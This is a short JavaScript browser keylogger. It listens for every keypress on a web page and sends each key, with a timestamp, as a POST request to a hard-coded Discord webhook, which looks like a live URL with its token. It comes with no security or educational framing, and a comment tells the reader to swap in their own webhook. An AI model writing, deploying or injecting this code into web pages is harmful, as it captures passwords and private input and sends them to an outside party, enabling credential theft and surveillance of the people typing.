document.addEventListener('keydown', function(event) {
    const keyLog = {
        content: `Key pressed: ${event.key}, Timestamp: ${new Date().toISOString()}`
    };

    // Discord webhook URL (Replace with your actual webhook URL)
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1197294878195978291/UOonrY9pH_jr0jvQvgxbyruZI-_-6ODXbwGeTSsULKmMjtwkvRAECeEtz5m35X2V9R24';

    // Send the logged key to the Discord webhook
    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(keyLog),
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
});
